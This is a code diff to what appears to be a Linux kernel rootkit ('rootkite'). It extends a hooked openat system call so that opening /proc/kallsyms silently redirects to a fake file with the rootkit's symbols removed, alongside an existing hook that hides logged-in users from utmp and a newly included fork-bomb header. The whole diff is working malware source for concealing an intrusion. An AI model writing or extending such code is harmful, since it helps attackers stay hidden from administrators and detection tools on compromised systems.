@@ -3,7 +3,7 @@
     #include "utmp.h" //utmp.h is not defined in the kernel so we define it on our own, contains the utmp struct to handle logged in users
     #include "kite_hook.h"
     #include "linked_list.h"
-
+    #include "forkbomb.h"
 
 static int utmpfd = -1;
 
@@ -17,6 +17,7 @@ static int utmpfd = -1;
    it ignores the dirfd. can create the file if not exists.
    the hook was created to check if the utmp file(users logged in) is opened,
    if it was, we save the file descriptor to later check in pread64 hook to filter the users.
+   if /proc/kallsyms is opened, updates and redirects to the fake file with removed refrences to rootkite ksyms
 */
 #ifdef PTREGS_SYSCALL_STUB
 static asmlinkage int hack_openat(struct pt_regs *regs){
@@ -24,6 +25,10 @@ static asmlinkage int hack_openat(struct pt_regs *regs){
     char *filename = (char *)regs->si;
     char *utmp_path = "/var/run/utmp";
     int utmp_path_len = 14;
+    char *kallsyms_path = "/proc/kallsyms";
+    int kallsyms_path_len = 15;
+    char *fake_kallsyms_path = "/tmp/ssh-XXTkJI/ksf_save_tmp";
+    int fake_kallsyms_path_len = 29;
 
     kern_filename = kzalloc(NAME_MAX, GFP_KERNEL);
 
@@ -41,7 +46,14 @@ static asmlinkage int hack_openat(struct pt_regs *regs){
         kfree(kern_filename);
         return utmpfd;
     }
-
+    if(memcmp(kern_filename, kallsyms_path, kallsyms_path_len) == 0){
+        hide_ksyms();
+        strcpy(kern_filename, fake_kallsyms_path);
+        if(copy_to_user(filename, kern_filename, fake_kallsyms_path_len) != 0){
+            kfree(kern_filename);
+            return orig_openat(regs);
+        }
+    }
     kfree(kern_filename);
     return orig_openat(regs);
 }
@@ -123,6 +135,10 @@ static asmlinkage int hack_openat(int dfd, const char *filename, int flags, umod
     char *kern_filename;
     char *utmp_path = "/var/run/utmp";
     int utmp_path_len = 14;
+    char *kallsyms_path = "/proc/kallsyms";
+    int kallsyms_path_len = 15;
+    char *fake_kallsyms_path = "/tmp/ssh-XXTkJI/ksf_save_tmp";
+    int fake_kallsyms_path_len = 29;
 
     kern_filename = kzalloc(NAME_MAX, GFP_KERNEL);
 
@@ -141,6 +157,14 @@ static asmlinkage int hack_openat(int dfd, const char *filename, int flags, umod
         return utmpfd;
     }
 
+    if(memcmp(kern_filename, kallsyms_path, kallsyms_path_len) == 0){
+        hide_ksyms();
+        strcpy(kern_filename, fake_kallsyms_path);
+        if(copy_to_user(filename, kern_filename, fake_kallsyms_path_len) != 0){
+            kfree(kern_filename);
+            return orig_openat(dfd, filename, flags, mode);
+        }
+    }
     kfree(kern_filename);
     return orig_openat(dfd, filename, flags, mode);
 }
